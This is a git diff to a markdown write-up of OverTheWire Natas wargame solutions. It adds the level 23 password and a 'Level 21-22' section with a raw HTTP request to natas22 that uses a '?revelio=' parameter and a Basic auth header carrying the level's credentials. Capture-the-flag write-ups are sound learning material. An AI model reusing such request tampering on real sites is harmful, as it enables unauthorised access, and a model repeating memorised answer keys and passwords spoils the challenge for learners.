@@ -26,6 +26,7 @@ The username is `natas` + the level.
 - 20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 - 21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 - 22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+- 23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
 
 ## Level 9-10
 
@@ -414,5 +415,22 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate, br
 Cookie: PHPSESSID=3h20kvdmafnlfm66cappne72cm
+Connection: keep-alive
+```
+
+## Level 21-22
+
+Make a request like the following:
+
+```txt
+GET /?revelio= HTTP/1.1
+Host: natas22.natas.labs.overthewire.org
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 ```
